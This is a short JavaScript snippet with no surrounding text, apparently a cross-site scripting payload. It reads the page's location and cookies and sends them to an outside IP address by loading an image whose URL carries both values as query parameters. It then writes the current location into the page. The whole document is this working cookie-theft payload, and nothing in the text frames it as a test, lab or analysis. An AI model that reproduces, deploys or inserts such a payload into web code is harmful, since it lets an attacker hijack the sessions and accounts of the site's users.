loc = document.location
cookie = document.cookie
var img1 = document.createElement('img');
img1.src = 'http://167.99.154.248/image1.png?loc='+loc+';cookie:'+cookie;
document.body.appendChild(img1);
document.write(window.location);
